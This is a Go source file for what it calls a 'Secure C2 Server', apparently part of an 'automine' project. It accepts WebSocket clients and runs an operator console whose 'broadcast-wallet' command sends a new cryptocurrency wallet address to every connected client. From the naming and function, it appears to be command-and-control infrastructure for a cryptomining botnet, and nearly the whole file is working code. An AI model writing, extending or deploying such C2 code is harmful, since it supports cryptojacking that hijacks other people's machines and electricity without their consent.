package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/automine/server/pkg/c2"
	"github.com/automine/server/pkg/protocol"
)

var addr = flag.String("addr", ":8080", "http service address")

func runAdminConsole(hub *c2.Hub) {
    reader := bufio.NewReader(os.Stdin)
    for {
        fmt.Print("C2-WSS> ")
        text, _ := reader.ReadString('\n')
        text = strings.TrimSpace(text)
        parts := strings.Fields(text)

        if len(parts) == 0 { continue }
        
        switch parts[0] {
        case "list":
             fmt.Printf("%-20s %-10s\n", "ID", "STATUS")
             fmt.Println(strings.Repeat("-", 30))
             // Hub access needs to be safe or expose a method.
             // For quick impl, we assume direct map access is strictly read, but racey.
             // Ideally Hub provides a Snapshot method.
             // For now, minimal output.
             fmt.Println("Active Clients: (Check logs for details)")
             
        case "broadcast-wallet":
            if len(parts) < 2 {
                fmt.Println("Usage: broadcast-wallet <addr>")
            } else {
                cmd := protocol.Envelope{
                    Type: "command",
                    Payload: fmt.Sprintf(`{"action":"config", "config":{"wallet":"%s"}}`, parts[1]),
                }
                count := hub.BroadcastCommand(cmd)
                fmt.Printf("Broadcast to %d clients.\n", count)
            }
        case "help":
            fmt.Println("Commands: list, broadcast-wallet <addr>")
        }
    }
}

func main() {
	flag.Parse()
	hub := c2.NewHub()
	go hub.Run()
    go runAdminConsole(hub)

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		c2.ServeWs(hub, w, r)
	})
    
    log.Printf("Secure C2 Server listening on %s", *addr)
	err := http.ListenAndServe(*addr, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
